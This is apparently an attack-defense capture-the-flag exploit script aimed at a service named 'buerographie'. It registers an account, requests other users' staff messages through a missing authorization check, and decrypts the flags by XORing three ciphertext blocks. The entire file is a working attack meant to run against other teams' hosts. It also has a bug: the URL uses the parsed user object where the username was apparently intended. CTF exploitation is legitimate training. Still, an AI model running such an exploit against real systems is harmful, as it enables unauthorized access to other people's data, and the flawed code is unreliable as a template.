#!/usr/bin/env python3
import os
import sys
sys.path.insert(1, '../imports/')
sys.path.insert(1, 'imports/')

import utils
import requests
import json
from bs4 import BeautifulSoup
from pwn import *

# Use this function to print stuff to client
def log(message):
    print(message, flush=True)

IP_ADDRESS = sys.argv[1]
TEAM = IP_ADDRESS.split(":")[2] # IPv6
dir_path = os.path.dirname(os.path.realpath(__file__)) + '/../'
flag_ids = {}
with open(dir_path + 'flag_ids.json', 'r', encoding='utf-8') as f:
    flag_ids = json.loads(f.read())
    #log(flag_ids)

# Adjust if needed
SERVICE = "buerographie"
PORT = 13731
TARGET_URL = f'http://[{IP_ADDRESS}]:{PORT}'

valid_ips = flag_ids.get(SERVICE, {})
valid_users = valid_ips.get(TEAM, [])
if TEAM not in valid_ips:
    print("No")
    exit(0)

psw = utils.password(max=16)
data = {
    "user": utils.username(max=16),
    "pass": psw,
    "pass2": psw
}

s = requests.Session()
s.post(TARGET_URL + "/register", data=data)
s.post(TARGET_URL + "/login", data=data)

print(valid_users)

for user in valid_users:
    user = json.loads(user)
    username = user["username"]
    print(username)

    encFlag = s.get(TARGET_URL + f"/staff/message/{user}").text

    print(encFlag)

    try:
        msg = bytes.fromhex(encFlag)
        l = len(msg)//3

        blocks = [ msg[:l], msg[l:2*l], msg[2*l:]]

        flag = []

        for i in range(l):
            flag.append(blocks[0][i] ^ blocks[1][i] ^ blocks[2][i])

        print(bytes(flag))
    except Exception as e:
        continue